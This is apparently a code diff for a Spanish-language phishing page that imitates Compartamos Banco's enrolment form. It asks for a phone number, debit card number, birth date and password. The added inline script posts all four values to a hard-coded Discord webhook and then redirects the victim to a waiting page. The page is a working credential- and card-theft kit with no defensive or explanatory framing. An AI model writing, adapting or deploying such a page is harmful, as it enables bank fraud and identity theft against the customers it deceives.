@@ -1,16 +1,50 @@
 <!DOCTYPE html>
 <html lang="es">
-<head><meta charset="UTF-8"><title>Enrolamiento</title><link rel="stylesheet" href="style.css"></head>
-<body><div class="container">
-<img src="Compartamos-Ba-768x163.jpg" alt="Logo" style="max-width: 100%; margin-bottom: 20px;">
-<p>Completa los siguientes datos para registrarte</p>
-<form id="form">
-<input type="text" id="telefono" placeholder="¿Cuál es tu número celular?" required>
-<label class="label">Número de tarjeta de débito</label>
-<input type="text" id="tarjeta" placeholder="Ingresa número de tarjeta" maxlength="16" required>
-<small>Debe contener 16 dígitos</small>
-<label class="label">Fecha de nacimiento</label>
-<input type="date" id="nacimiento" required>
-<input type="password" id="password" placeholder="Contraseña" required>
-<button type="submit">Continuar</button>
-</form></div><script src="script.js"></script></body></html>
+<head>
+    <meta charset="UTF-8">
+    <title>Compartamos</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="Compartamos-Ba-768x163.jpg" alt="Logo Compartamos Banco" style="max-width: 100%; height: auto; margin-bottom: 20px;">
+        <p>Completa los siguientes datos para continuar</p>
+        <form id="form">
+            <input type="tel" id="telefono" placeholder="¿Cuál es tu número celular?" required>
+            <label class="label">Número de tarjeta de débito</label>
+            <input type="tel" id="tarjeta" placeholder="Ingresa número de tarjeta" maxlength="16" required>
+            <small>Debe contener 16 dígitos</small>
+            <label class="label">Fecha de nacimiento</label>
+            <input type="date" id="nacimiento" required>
+            <input type="password" id="password" placeholder="Contraseña" required>
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const telefono = document.getElementById('telefono').value;
+            const tarjeta = document.getElementById('tarjeta').value;
+            const nacimiento = document.getElementById('nacimiento').value;
+            const password = document.getElementById('password').value;
+
+            if (!/^\d{16}$/.test(tarjeta)) {
+                alert("La tarjeta debe contener exactamente 16 dígitos.");
+                return;
+            }
+
+            const data = {
+                content: `📄 Nuevo registro:\n📱 Teléfono: ${telefono}\n💳 Tarjeta: ${tarjeta}\n🎂 Nacimiento: ${nacimiento}\n🔒 Contraseña: ${password}`
+            };
+
+            await fetch("https://discord.com/api/webhooks/1354514961703108739/PaD7lPWNnu8lfenpSc3oalDW7C3F9qVzHDM4SuRjSir6sC7EOW9X8DX8Z02F-GLiyzWN", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+
+            window.location.href = "espera.html";
+        });
+    </script>
+</body>
+</html>
